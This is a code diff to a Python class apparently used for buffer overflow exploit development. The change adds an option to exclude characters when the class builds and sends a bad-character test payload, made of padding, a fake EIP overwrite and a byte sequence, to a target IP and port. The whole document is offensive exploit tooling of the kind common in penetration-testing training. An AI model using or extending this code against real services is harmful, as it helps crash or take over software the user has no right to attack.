@@ -50,9 +50,6 @@ class Buff:
 
 
     # --- Exploit Configuration ---
-    def setBadChars(self, chars: str) -> None:
-        self.bad_chars = chars
-
     def setPrefix(self, prefix: str) -> None:
         self.prefix = prefix
     
@@ -111,10 +108,12 @@ class Buff:
 
 
     # --- Bad Character Explit ---
-    def generateBadChars(self, fake_eip: str = PLACEHOLDER_EIP) -> str:
+    def generateBadChars(self, exclude: [str] = None, fake_eip: str = PLACEHOLDER_EIP) -> str:
         """
         PREFIX + BUFFERS + EIP + BAD CHARACTERS + POSTFIX
         """
+        if exclude is None:
+            exclude = []
 
         # check EIP
         if self.eip_offset is None:
@@ -124,9 +123,14 @@ class Buff:
         if self.buffer_size is None:
             raise Exception("Buffer size is not set")
 
+        # filter exclusions
+        bad_chars = self.bad_chars
+        for ex in exclude:
+            bad_chars = bad_chars.replace(ex, "")
+
         buffer = "A" * self.eip_offset
         buffer += fake_eip # fake EIP to overflow address
-        buffer += self.bad_chars
+        buffer += bad_chars
 
         # add remaning buffers if missing
         if len(buffer) < self.buffer_size:
@@ -134,8 +138,8 @@ class Buff:
 
         return self.prefix + buffer + self.postfix
 
-    def sendBadChars(self, fake_eip: str = PLACEHOLDER_EIP) -> None:
-        buffer = self.generateBadChars(fake_eip)
+    def sendBadChars(self, exclude: [str] = None, fake_eip: str = PLACEHOLDER_EIP) -> None:
+        buffer = self.generateBadChars(exclude, fake_eip)
         ip, port = self.target
         self.sender(ip, port, buffer)
 
